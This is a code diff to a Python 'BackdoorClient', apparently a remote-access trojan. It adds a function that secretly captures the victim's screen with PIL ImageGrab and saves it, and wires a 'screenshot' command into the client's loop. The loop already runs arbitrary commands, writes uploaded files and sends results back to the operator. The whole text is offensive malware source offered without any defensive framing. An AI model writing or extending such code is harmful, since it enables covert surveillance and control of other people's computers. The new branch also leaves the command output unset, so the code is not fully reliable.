@@ -3,6 +3,9 @@ import json
 import subprocess
 import os
 import base64
+from PIL import ImageGrab
+import sys
+import time
 
 
 
@@ -55,6 +58,15 @@ class BackdoorClient:
         os.chdir(path)
         return f"[Changing current directory to {path}]"
     
+    def take_screenshot(self,filename):
+        try:
+            image = ImageGrab.grab()
+            image.save(filename, "JPEG")
+            return "[Screenshot Sucessful]"
+        except Exception as e:
+            return (f"[Screenshot failed: {str(e)}]")
+            
+    
     def run(self):
         while True:
             try:
@@ -74,8 +86,13 @@ class BackdoorClient:
                 elif command[0] == "upload":
                     command_output = self.write_file(command[1], command[2])
 
+                elif command[0] == "screenshot":
+                    self.take_screenshot(command[1])
+
                 else:
                     command_output = self.deliver_command(command)
+
+
 
                 self.json_send(command_output)
 
